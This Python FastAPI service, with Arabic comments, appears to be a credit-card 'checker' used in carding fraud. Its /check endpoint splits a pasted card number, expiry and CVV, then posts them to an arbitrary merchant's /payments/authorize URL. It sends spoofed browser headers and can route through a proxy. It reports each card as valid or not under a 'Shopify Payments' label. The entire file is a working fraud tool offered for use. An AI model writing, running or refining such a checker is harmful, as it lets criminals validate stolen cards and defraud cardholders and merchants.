from fastapi import FastAPI, Query, Request
import httpx
import json

app = FastAPI()

# Headers احترافية
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}

@app.api_route("/check", methods=["GET", "POST"])
async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), amount: str = "31.0"):
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
            
        request_headers = HEADERS.copy()
        request_headers["Referer"] = f"{site}/"
        request_headers["Origin"] = site

        cc_parts = cc.split('|')
        payload = {
            "card_number": cc_parts[0] if len(cc_parts) > 0 else cc,
            "exp_month": cc_parts[1] if len(cc_parts) > 1 else "",
            "exp_year": cc_parts[2] if len(cc_parts) > 2 else "",
            "cvv": cc_parts[3] if len(cc_parts) > 3 else "",
            "amount": amount
        }

        # استخدام Transport للتعامل الصحيح مع البروكسي
        transport = httpx.AsyncHTTPTransport(proxy=proxy) if proxy else None

        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
            target_url = f"{site}/payments/authorize"
            
            # الطلب سيتم إرساله كـ POST كما هو معتاد في بوابات الدفع
            response = await client.post(target_url, json=payload)
            
            try:
                data = response.json()
                msg = data.get("message") or data.get("error") or str(response.status_code)
            except:
                msg = str(response.status_code)
            
            return {
                "Gateway": "Shopify Payments",
                "Price": amount,
                "Proxy": "Live" if proxy else "None",
                "Response": msg,
                "Status": "true" if response.status_code == 200 else "false",
                "CC": cc
            }

    except Exception as e:
        return {
            "Gateway": "Shopify Payments",
            "Price": amount,
            "Proxy": "Error",
            "Response": str(e),
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
